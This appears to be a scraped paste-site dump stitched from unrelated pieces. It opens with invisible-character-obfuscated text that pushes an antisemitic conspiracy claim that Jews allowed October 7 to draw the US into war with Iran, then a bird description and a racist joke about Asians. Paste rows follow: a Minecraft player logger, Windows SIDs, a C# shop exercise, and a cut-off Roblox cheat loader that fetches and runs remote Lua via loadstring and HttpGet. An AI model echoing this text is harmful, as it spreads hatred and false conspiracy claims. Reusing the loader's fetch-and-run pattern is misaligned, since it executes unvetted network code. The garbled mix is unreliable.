I‎s‎r‎a‎e‎l‎ ‎c‎h‎i‎e‎f‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎s‎p‎o‎k‎e‎s‎m‎a‎n‎ ‎R‎e‎a‎r‎ ‎A‎d‎m‎i‎r‎a‎l‎ ‎D‎a‎n‎i‎e‎l‎ ‎H‎a‎g‎a‎r‎i‎ ‎s‎a‎i‎d‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎s‎ ‎w‎e‎r‎e‎ ‎n‎o‎t‎ ‎b‎e‎i‎n‎g‎ ‎t‎o‎l‎d‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎a‎n‎y‎ ‎s‎p‎e‎c‎i‎a‎l‎ ‎p‎r‎e‎p‎a‎r‎a‎t‎i‎o‎n‎s‎ ‎b‎u‎t‎ ‎a‎d‎d‎e‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎w‎a‎s‎ ‎“‎h‎i‎g‎h‎l‎y‎ ‎p‎r‎e‎p‎a‎r‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎“‎.‎

A‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎.‎

T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎s‎c‎e‎n‎a‎r‎i‎o‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎d‎r‎a‎g‎ ‎t‎h‎e‎ ‎U‎S‎ ‎i‎n‎t‎o‎ ‎a‎ ‎w‎a‎r‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎,‎ ‎b‎u‎t‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎h‎e‎ ‎s‎p‎e‎a‎k‎s‎.‎

T‎h‎i‎s‎ ‎w‎a‎s‎ ‎n‎e‎v‎e‎r‎ ‎a‎b‎o‎u‎t‎ ‎G‎a‎z‎a‎.‎ ‎T‎h‎e‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎a‎t‎t‎a‎c‎k‎ ‎w‎a‎s‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎.‎ ‎N‎o‎ ‎o‎n‎e‎ ‎c‎a‎n‎ ‎d‎e‎n‎y‎ ‎t‎h‎a‎t‎.‎ ‎W‎a‎t‎c‎h‎ ‎t‎h‎e‎ ‎r‎e‎c‎e‎n‎t‎ ‎A‎l‎-‎J‎a‎z‎e‎e‎r‎a‎ ‎d‎o‎c‎u‎m‎e‎n‎t‎a‎r‎y‎ ‎o‎n‎ ‎i‎t‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎f‎o‎r‎m‎e‎r‎ ‎D‎e‎p‎u‎t‎y‎ ‎D‎e‎f‎e‎n‎s‎e‎ ‎A‎d‎v‎i‎s‎o‎r‎ ‎f‎r‎o‎m‎ ‎I‎s‎r‎a‎e‎l‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎t‎h‎i‎s‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎s‎i‎n‎g‎l‎e‎ ‎w‎o‎r‎s‎t‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎“‎f‎a‎i‎l‎u‎r‎e‎”‎ ‎s‎i‎n‎c‎e‎ ‎1‎9‎3‎9‎,‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎o‎f‎ ‎m‎o‎d‎e‎r‎n‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎.‎

O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎|‎ ‎A‎l‎ ‎J‎a‎z‎e‎e‎r‎a‎
E‎v‎e‎n‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎d‎ ‎b‎e‎g‎u‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎k‎n‎e‎w‎ ‎t‎h‎a‎t‎ ‎H‎a‎m‎a‎s‎ ‎w‎a‎s‎ ‎m‎o‎v‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎,‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎r‎e‎f‎u‎s‎e‎d‎ ‎t‎o‎ ‎f‎o‎r‎t‎i‎f‎y‎ ‎t‎h‎e‎ ‎b‎o‎r‎d‎e‎r‎.‎ ‎T‎h‎e‎y‎ ‎w‎a‎n‎t‎e‎d‎ ‎t‎h‎i‎s‎ ‎t‎o‎ ‎h‎a‎p‎p‎e‎n‎,‎ ‎a‎s‎ ‎a‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎f‎o‎r‎ ‎a‎ ‎r‎e‎g‎i‎o‎n‎a‎l‎ ‎w‎a‎r‎,‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎u‎s‎e‎ ‎t‎h‎e‎ ‎U‎S‎ ‎m‎i‎l‎i‎t‎a‎r‎y‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎o‎u‎t‎ ‎I‎r‎a‎n‎,‎ ‎t‎h‎e‎i‎r‎ ‎n‎e‎m‎e‎s‎i‎s‎.‎

A‎g‎a‎i‎n‎,‎ ‎t‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎h‎a‎t‎ ‎c‎o‎u‎l‎d‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎t‎h‎i‎s‎,‎ ‎b‎u‎t‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎o‎s‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎i‎s‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎U‎S‎ ‎c‎u‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎o‎f‎f‎.‎ ‎B‎r‎a‎n‎d‎o‎n‎ ‎j‎u‎s‎t‎ ‎a‎n‎n‎o‎u‎n‎c‎e‎d‎ ‎t‎h‎i‎s‎ ‎w‎e‎e‎k‎ ‎t‎h‎a‎t‎ ‎h‎e‎ ‎i‎s‎ ‎1‎0‎0‎%‎ ‎b‎e‎h‎i‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎s‎t‎a‎r‎t‎i‎n‎g‎ ‎a‎ ‎w‎a‎r‎ ‎w‎i‎t‎h‎ ‎I‎r‎a‎n‎.‎

S‎o‎…‎ ‎g‎e‎t‎ ‎r‎e‎a‎d‎y‎ ‎f‎o‎r‎ ‎t‎h‎a‎t‎,‎ ‎I‎ ‎g‎u‎e‎s‎s‎.‎


🚨🇮🇱‎ ‎B‎R‎E‎A‎K‎I‎N‎G‎

J‎E‎W‎S‎ ‎A‎R‎E‎ ‎N‎O‎W‎ ‎D‎E‎M‎A‎N‎D‎I‎N‎G‎ ‎T‎H‎E‎Y‎ ‎B‎E‎ ‎A‎L‎L‎O‎W‎E‎D‎ ‎T‎O‎ ‎S‎E‎T‎T‎L‎E‎ ‎I‎N‎ ‎L‎E‎B‎A‎N‎O‎N‎.‎

W‎H‎E‎N‎ ‎W‎I‎L‎L‎ ‎T‎H‎E‎S‎E‎ ‎H‎O‎M‎E‎L‎E‎S‎S‎ ‎J‎E‎W‎S‎ ‎L‎E‎A‎V‎E‎ ‎T‎H‎E‎ ‎W‎O‎R‎L‎D‎ ‎A‎L‎O‎N‎E‎ ‎p‎i‎c‎.‎t‎w‎i‎t‎t‎e‎r‎.‎c‎o‎m‎/‎8‎r‎q‎5‎8‎e‎l‎0‎T‎e‎

—‎ ‎D‎e‎f‎u‎n‎d‎ ‎I‎s‎r‎a‎e‎l‎ ‎N‎o‎w‎ ‎(‎@‎D‎e‎f‎u‎n‎d‎I‎s‎r‎a‎e‎l‎N‎o‎w‎)‎ ‎A‎p‎r‎i‎l‎ ‎1‎1‎,‎ ‎2‎0‎2‎4‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎o‎r‎a‎n‎g‎e‎ ‎c‎h‎a‎t‎ ‎(‎E‎p‎t‎h‎i‎a‎n‎u‎r‎a‎ ‎a‎u‎r‎i‎f‎r‎o‎n‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎b‎i‎r‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎o‎n‎e‎y‎e‎a‎t‎e‎r‎ ‎f‎a‎m‎i‎l‎y‎,‎ ‎M‎e‎l‎i‎p‎h‎a‎g‎i‎d‎a‎e‎,‎ ‎e‎n‎d‎e‎m‎i‎c‎ ‎t‎o‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎.‎ ‎W‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎0‎ ‎t‎o‎ ‎1‎2‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎3‎.‎9‎ ‎t‎o‎ ‎4‎.‎7‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎a‎n‎d‎ ‎a‎v‎e‎r‎a‎g‎e‎ ‎w‎i‎n‎g‎s‎p‎a‎n‎ ‎o‎f‎ ‎1‎9‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎7‎.‎5‎ ‎i‎n‎c‎h‎e‎s‎)‎,‎ ‎i‎t‎ ‎i‎s‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎g‎r‎o‎u‎n‎d‎ ‎s‎o‎n‎g‎b‎i‎r‎d‎ ‎w‎i‎t‎h‎ ‎r‎e‎l‎a‎t‎i‎v‎e‎l‎y‎ ‎l‎o‎n‎g‎,‎ ‎b‎r‎o‎a‎d‎ ‎a‎n‎d‎ ‎r‎o‎u‎n‎d‎e‎d‎ ‎w‎i‎n‎g‎s‎ ‎a‎n‎d‎ ‎a‎ ‎s‎h‎o‎r‎t‎ ‎s‎q‎u‎a‎r‎e‎-‎e‎n‎d‎e‎d‎ ‎t‎a‎i‎l‎.‎ ‎T‎h‎e‎ ‎m‎a‎l‎e‎'‎s‎ ‎f‎e‎a‎t‎h‎e‎r‎s‎ ‎a‎r‎e‎ ‎m‎o‎s‎t‎l‎y‎ ‎a‎ ‎d‎e‎e‎p‎,‎ ‎w‎a‎r‎m‎,‎ ‎c‎a‎d‎m‎i‎u‎m‎ ‎y‎e‎l‎l‎o‎w‎ ‎w‎i‎t‎h‎ ‎o‎r‎a‎n‎g‎e‎ ‎o‎v‎e‎r‎t‎o‎n‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎i‎s‎ ‎c‎o‎l‎o‎u‎r‎ ‎i‎s‎ ‎s‎t‎r‎o‎n‎g‎e‎s‎t‎ ‎o‎n‎ ‎t‎h‎e‎ ‎c‎r‎o‎w‎n‎ ‎a‎n‎d‎ ‎b‎r‎e‎a‎s‎t‎.‎ ‎F‎e‎m‎a‎l‎e‎s‎ ‎a‎r‎e‎ ‎m‎o‎t‎t‎l‎e‎d‎ ‎i‎n‎ ‎g‎r‎e‎y‎-‎b‎r‎o‎w‎n‎,‎ ‎w‎i‎t‎h‎ ‎u‎n‎d‎e‎r‎p‎a‎r‎t‎s‎ ‎a‎ ‎s‎o‎f‎t‎e‎r‎ ‎f‎a‎w‎n‎y‎ ‎y‎e‎l‎l‎o‎w‎.‎ ‎I‎t‎s‎ ‎d‎i‎e‎t‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎m‎a‎i‎n‎l‎y‎ ‎o‎f‎ ‎s‎m‎a‎l‎l‎ ‎i‎n‎s‎e‎c‎t‎s‎,‎ ‎s‎p‎i‎d‎e‎r‎s‎ ‎a‎n‎d‎ ‎o‎t‎h‎e‎r‎ ‎i‎n‎v‎e‎r‎t‎e‎b‎r‎a‎t‎e‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎g‎r‎o‎u‎n‎d‎ ‎o‎r‎ ‎s‎h‎r‎u‎b‎s‎.‎ ‎I‎t‎s‎ ‎c‎a‎l‎l‎ ‎c‎o‎n‎s‎i‎s‎t‎s‎ ‎o‎f‎ ‎a‎ ‎m‎e‎t‎a‎l‎l‎i‎c‎ ‎t‎w‎a‎n‎g‎ ‎t‎a‎n‎g‎ ‎a‎n‎d‎ ‎a‎ ‎s‎o‎f‎t‎e‎r‎ ‎t‎c‎h‎e‎k‎ ‎t‎c‎h‎e‎k‎ ‎s‎o‎u‎n‎d‎.‎ ‎T‎h‎i‎s‎ ‎o‎r‎a‎n‎g‎e‎ ‎c‎h‎a‎t‎ ‎p‎e‎r‎c‎h‎e‎d‎ ‎o‎n‎ ‎a‎ ‎t‎w‎i‎g‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎n‎e‎a‎r‎ ‎L‎a‎k‎e‎ ‎C‎a‎r‎g‎e‎l‎l‎i‎g‎o‎ ‎i‎n‎ ‎N‎e‎w‎ ‎S‎o‎u‎t‎h‎ ‎W‎a‎l‎e‎s‎,‎ ‎A‎u‎s‎t‎r‎a‎l‎i‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎J‎o‎h‎n‎ ‎H‎a‎r‎r‎i‎s‎o‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎b‎i‎n‎g‎ ‎b‎o‎n‎g‎ ‎c‎h‎i‎n‎g‎a‎ ‎l‎i‎g‎a‎ ‎d‎i‎n‎g‎ ‎d‎o‎n‎g‎ ‎I‎'‎m‎ ‎o‎u‎t‎,‎ ‎y‎o‎u‎ ‎f‎r‎a‎g‎g‎i‎t‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎g‎r‎i‎l‎l‎ ‎u‎p‎ ‎s‎o‎m‎e‎ ‎A‎s‎i‎a‎n‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎a‎n‎ ‎A‎s‎i‎a‎n‎ ‎b‎a‎r‎b‎e‎q‎u‎e‎.‎"
qvPLhtYx,entitySense.lua,opencomputerstest2,Lua,Friday 12th of April 2024 10:22:54 PM CDT,"local function log(...)
	if not ... then return end
	local file = fs.open(""dump.csv"")
	for k,v in pairs({...}) do
		file.write(v)
	end
	file.write(""\n"")
	file.close()
end
local f = peripheral.find
local sense = assert(((""plethora:sensor"") or f(""manipulator"") or f(""neuralInterface"")).sense, ""Could not find entity sensor"")
for k,ent in pairs(sense()) do
	if ent.key == ""minecraft:player"" then
		log(ent.name, ent.id)
	end
end"
0SKcqYSU,Ran PH,tinn01,GetText,Friday 12th of April 2024 10:10:44 PM CDT,"S-1-5-21-1193083378-3124615022-3272316965-1002 - me
S-1-5-21-728818745-296284551-1254503619-1001 - clro
S-1-5-21-1107707846-1464881669-2142255313-1001 - yow"
05EM94QY,OnlineStore v4,RedFlys,C#,Friday 12th of April 2024 09:56:21 PM CDT,"Good iPhone12 = new Good(""IPhone 12"");
Good iPhone11 = new Good(""IPhone 11"");

Warehouse warehouse = new Warehouse();

Shop shop = new Shop(warehouse);

warehouse.Delive(iPhone12, 10);
warehouse.Delive(iPhone11, 1);

//Вывод всех товаров на складе с их остатком

Cart cart = shop.Cart();
cart.Add(iPhone12, 4);
cart.Add(iPhone11, 3); //при такой ситуации возникает ошибка так, как нет нужного количества товара на складе

//Вывод всех товаров в корзине

Console.WriteLine(cart.Order().Paylink);

cart.Add(iPhone12, 9); //Ошибка, после заказа со склада убираются заказанные товары


public class Warehouse : IDeliveryWarehouse
{
    private readonly Dictionary<Good, int> _goods;

    public Warehouse() =>    
        _goods = new(new GoodEqualityCompare());
    

    public void Delive(Good good, int countGoods)
    {
        good = good ?? throw new ArgumentNullException();

        if (countGoods < 0)
            throw new ArgumentOutOfRangeException();

        if (_goods.ContainsKey(good) == false)
            _goods[good] = 0;

        _goods[good] += countGoods;
    }

    public bool CanIssue(Good good, int countGoods)
    {
        good = good ?? throw new ArgumentNullException();

        if (countGoods < 0)
            throw new ArgumentOutOfRangeException();

        if (_goods.TryGetValue(good, out int count) == false)
            return false;
            
        return count >= countGoods;        
    }

    public void TransferForDelivery(Good good, int countGoods)
    {
        good = good ?? throw new ArgumentNullException();

        if (countGoods < 0)
            throw new ArgumentOutOfRangeException();

        if (_goods.ContainsKey(good) == false || _goods[good] < countGoods)
            throw new ArgumentOutOfRangeException();
        
        _goods[good] -= countGoods;
    }
}

public class Shop
{
    private readonly Warehouse _warehouse;

    public Shop(Warehouse warehouse) =>
        _warehouse = warehouse ?? throw new ArgumentNullException();
    
    public Cart Cart() =>
         new Cart(_warehouse);    
}

public class Cart
{
    private readonly Dictionary<Good, int> _goods;
    private readonly IDeliveryWarehouse _warehouse;

    public Cart(IDeliveryWarehouse warehouse) 
    {
        _warehouse = warehouse ?? throw new ArgumentNullException();

        GoodEqualityCompare goodEqualityCompare = new();
        _goods = new(goodEqualityCompare);
    }

    public void Add(Good good, int countGoods)
    {
        good = good ?? throw new ArgumentNullException();

        if (countGoods < 0)
            throw new ArgumentOutOfRangeException();

        if (_warehouse.CanIssue(good, countGoods) == false)
            throw new InvalidOperationException();

        if (_goods.ContainsKey(good) == false)
            _goods[good] = 0;

        _goods[good] += countGoods;          
    }

    public PayOrder Order()
    {
        foreach(var goods in _goods)
        {
            _warehouse.TransferForDelivery(goods.Key, goods.Value);
        }

        _goods.Clear();

        return new PayOrder();
    }
}

public class Good
{
    public Good(string name)
    {
        if (string.IsNullOrEmpty(name))
            throw new ArgumentNullException();

        Name = name;
    }

    public string Name { get; }
}

public class PayOrder
{
    public PayOrder() { }

    public string Paylink { get; }
}

public interface IDeliveryWarehouse
{
    public bool CanIssue(Good good, int countGoods);

    public void TransferForDelivery(Good good, int countGoods);
}

public class GoodEqualityCompare : IEqualityComparer<Good>
{
    public bool Equals(Good? good1, Good? good2)
    {
        if (ReferenceEquals(good1, good2)) 
            return true;

        if (good1 == null || good2 == null)
            return false;

        return good1.Name == good2.Name;
    }

    public int GetHashCode(Good good) => 
        good.Name.GetHashCode();
}"
ES0aczat,cooked da hood,fwefwfdwf,Lua,Friday 12th of April 2024 09:25:13 PM CDT,"if not LPH_OBFUSCATED then
    getfenv().LPH_NO_VIRTUALIZE = function(f) return f end;
end

local gui = 
{
	blazedLoader = Instance.new(""ScreenGui""),
	Frame = Instance.new(""Frame""),
	UICorner = Instance.new(""UICorner""),
	TextLabel = Instance.new(""TextLabel""),
	TextLabel_1 = Instance.new(""TextLabel""),
	signin_load = Instance.new(""TextButton""),
	UICorner_1 = Instance.new(""UICorner""),
	UIStroke = Instance.new(""UIStroke""),
	TextLabel_2 = Instance.new(""TextLabel""),
	fps_checkbox = Instance.new(""Frame""),
	UICorner_2 = Instance.new(""UICorner""),
	UICorner_3 = Instance.new(""UICorner""),
	UIStroke_1 = Instance.new(""UIStroke""),
	ImageLabel = Instance.new(""ImageLabel""),
	fpscheckbox_button = Instance.new(""TextButton""),
	TextLabel_3 = Instance.new(""TextLabel""),
	UICorner_4 = Instance.new(""UICorner""),
	UIStroke_2 = Instance.new(""UIStroke""),
	UIStroke_3 = Instance.new(""UIStroke""),
}

gui.blazedLoader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.blazedLoader.Name = ""blazedLoader""
gui.blazedLoader.Parent = game:GetService(""CoreGui"")

gui.Frame.BorderSizePixel = 0
gui.Frame.Size = UDim2.new(0, 396, 0, 249)
gui.Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.Frame.Name = ""Frame""
gui.Frame.Position = UDim2.new(0.396226, 0, 0.362031, 0)
gui.Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
gui.Frame.Parent = gui.blazedLoader

gui.UICorner.Name = ""UICorner""
gui.UICorner.CornerRadius = UDim.new(0, 12)
gui.UICorner.Parent = gui.Frame

gui.TextLabel.BorderSizePixel = 0
gui.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gui.TextLabel.FontFace = Font.new(""rbxassetid://11702779517"", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
gui.TextLabel.TextSize = 30
gui.TextLabel.Position = UDim2.new(0.244949, 0, 0.11245, 0)
gui.TextLabel.Size = UDim2.new(0, 147, 0, 50)
gui.TextLabel.Name = ""TextLabel""
gui.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
gui.TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.TextLabel.Text = ""cooked""
gui.TextLabel.BackgroundTransparency = 1
gui.TextLabel.Parent = gui.Frame

gui.TextLabel_1.BorderSizePixel = 0
gui.TextLabel_1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gui.TextLabel_1.FontFace = Font.new(""rbxassetid://11702779517"", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
gui.TextLabel_1.TextSize = 20
gui.TextLabel_1.Position = UDim2.new(0.479798, 0, 0.11245, 0)
gui.TextLabel_1.Size = UDim2.new(0, 106, 0, 57)
gui.TextLabel_1.Name = ""TextLabel""
gui.TextLabel_1.TextColor3 = Color3.fromRGB(227, 181, 200)
gui.TextLabel_1.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.TextLabel_1.Text = ""v3.1.1""
gui.TextLabel_1.BackgroundTransparency = 1
gui.TextLabel_1.Parent = gui.Frame

gui.signin_load.BorderSizePixel = 0
gui.signin_load.BackgroundColor3 = Color3.fromRGB(157, 125, 138)
gui.signin_load.FontFace = Font.new(""rbxassetid://11702779517"", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
gui.signin_load.TextColor3 = Color3.fromRGB(255, 255, 255)
gui.signin_load.Position = UDim2.new(0.161616, 0, 0.598394, 0)
gui.signin_load.TextSize = 14
gui.signin_load.Size = UDim2.new(0, 274, 0, 31)
gui.signin_load.Name = ""signin_load""
gui.signin_load.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.signin_load.Text = ""Sign In""
gui.signin_load.Active = true
gui.signin_load.Selectable = true
gui.signin_load.Parent = gui.Frame

gui.UICorner_1.Name = ""UICorner""
gui.UICorner_1.Parent = gui.signin_load

gui.UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
gui.UIStroke.Name = ""UIStroke""
gui.UIStroke.Thickness = 1.4
gui.UIStroke.Color = Color3.fromRGB(25, 25, 25)
gui.UIStroke.Parent = gui.signin_load

gui.TextLabel_2.BorderSizePixel = 0
gui.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gui.TextLabel_2.FontFace = Font.new(""rbxassetid://11702779517"", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
gui.TextLabel_2.TextSize = 15
gui.TextLabel_2.Position = UDim2.new(0.290404, 0, 0.690763, 0)
gui.TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
gui.TextLabel_2.Name = ""TextLabel""
gui.TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
gui.TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.TextLabel_2.Text = ""Boost FPS""
gui.TextLabel_2.BackgroundTransparency = 1
gui.TextLabel_2.Parent = gui.Frame

gui.fps_checkbox.BorderSizePixel = 0
gui.fps_checkbox.Size = UDim2.new(0, 20, 0, 20)
gui.fps_checkbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.fps_checkbox.Name = ""fps_checkbox""
gui.fps_checkbox.Position = UDim2.new(0.383838, 0, 0.751004, 0)
gui.fps_checkbox.BackgroundColor3 = Color3.fromRGB(157, 125, 138)
gui.fps_checkbox.Parent = gui.Frame

gui.UICorner_2.Name = ""UICorner""
gui.UICorner_2.CornerRadius = UDim.new(0, 5)
gui.UICorner_2.Parent = gui.fps_checkbox

gui.UICorner_3.Name = ""UICorner""
gui.UICorner_3.Parent = gui.fps_checkbox

gui.UIStroke_1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
gui.UIStroke_1.Name = ""UIStroke""
gui.UIStroke_1.Thickness = 1.4
gui.UIStroke_1.Color = Color3.fromRGB(25, 25, 25)
gui.UIStroke_1.Parent = gui.fps_checkbox

gui.ImageLabel.BorderSizePixel = 0
gui.ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gui.ImageLabel.Image = ""http://www.roblox.com/asset/?id=9754130783""
gui.ImageLabel.Size = UDim2.new(0, 20, 0, 20)
gui.ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.ImageLabel.Name = ""ImageLabel""
gui.ImageLabel.BackgroundTransparency = 1
gui.ImageLabel.Parent = gui.fps_checkbox

gui.fpscheckbox_button.BorderSizePixel = 0
gui.fpscheckbox_button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gui.fpscheckbox_button.FontFace = Font.new(""rbxasset://fonts/families/SourceSansPro.json"", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
gui.fpscheckbox_button.TextColor3 = Color3.fromRGB(0, 0, 0)
gui.fpscheckbox_button.Position = UDim2.new(-2.7, 0, 0, 0)
gui.fpscheckbox_button.TextSize = 14
gui.fpscheckbox_button.Size = UDim2.new(0, 200, 0, 20)
gui.fpscheckbox_button.Name = ""fpscheckbox_button""
gui.fpscheckbox_button.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.fpscheckbox_button.Text = """"
gui.fpscheckbox_button.Active = true
gui.fpscheckbox_button.BackgroundTransparency = 1
gui.fpscheckbox_button.Selectable = true
gui.fpscheckbox_button.Parent = gui.fps_checkbox

gui.TextLabel_3.BorderSizePixel = 0
gui.TextLabel_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
gui.TextLabel_3.FontFace = Font.new(""rbxassetid://11702779517"", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
gui.TextLabel_3.TextSize = 14
gui.TextLabel_3.Position = UDim2.new(0.161616, 0, 0.425703, 0)
gui.TextLabel_3.Size = UDim2.new(0, 274, 0, 36)
gui.TextLabel_3.Name = ""TextLabel""
gui.TextLabel_3.TextColor3 = Color3.fromRGB(50, 50, 50)
gui.TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
gui.TextLabel_3.Text = ""   ""..tostring(LRM_LinkedDiscordID)..""""
gui.TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
gui.TextLabel_3.Parent = gui.Frame

gui.UICorner_4.Name = ""UICorner""
gui.UICorner_4.Parent = gui.TextLabel_3

gui.UIStroke_2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
gui.UIStroke_2.Name = ""UIStroke""
gui.UIStroke_2.Thickness = 1.4
gui.UIStroke_2.Color = Color3.fromRGB(25, 25, 25)
gui.UIStroke_2.Parent = gui.TextLabel_3

gui.UIStroke_3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
gui.UIStroke_3.Name = ""UIStroke""
gui.UIStroke_3.Thickness = 1.4
gui.UIStroke_3.Color = Color3.fromRGB(25, 25, 25)
gui.UIStroke_3.Parent = gui.Frame



gui.fpscheckbox_button.MouseButton1Click:Connect(function()
	if gui.fps_checkbox.BackgroundColor3 == Color3.fromRGB(157, 125, 138) then
		gui.fps_checkbox.BackgroundColor3 = Color3.fromRGB(20,20,20) 
		gui.ImageLabel.Visible = false
		getgenv().boostframes = false
	elseif gui.fps_checkbox.BackgroundColor3 == Color3.fromRGB(20,20,20) then
		getgenv().boostframes = true
		gui.fps_checkbox.BackgroundColor3 = Color3.fromRGB(157, 125, 138)
		gui.ImageLabel.Visible = true
		end
end)

gui.signin_load.MouseButton1Click:Connect(function()
gui.blazedLoader:Destroy()
    local loadingtime = tick()
    local notificationLibrary = loadstring(game:HttpGet(""https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua""))();
    local notifications = notificationLibrary.new({            
        NotificationLifetime = 5, 
        NotificationPosition = ""Middle"",
        
        TextFont = Enum.Font.Code,
        TextColor = Color3.fromRGB(255, 255, 255),
        TextSize = 15,
        
        TextStrokeTransparency = 0, 
        TextStrokeColor = Color3.fromRGB(0, 0, 0)
    });
    
    local AkaliNotif = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua""))();
    local ANotify = AkaliNotif.Notify;
    
    
    function Kick(Reason)
        game.Players.LocalPlayer:Kick(Reason)
    end
    
    getgenv().NotiMode = ""Roblox""
    
    function Notifications(NotiINFO)
        if getgenv().NotiMode == ""Roblox"" then
            game:GetService(""StarterGui""):SetCore(""SendNotification"",{
                Title = ""cooked"", -- Required
                Text = NotiINFO, -- Required
                Icon = ""rbxassetid://15115954522"" -- Optional
            })
        else
            if getgenv().NotiMode == ""Xaxa"" then
                notifications:BuildNotificationUI();
                notifications:Notify(NotiINFO);
        else
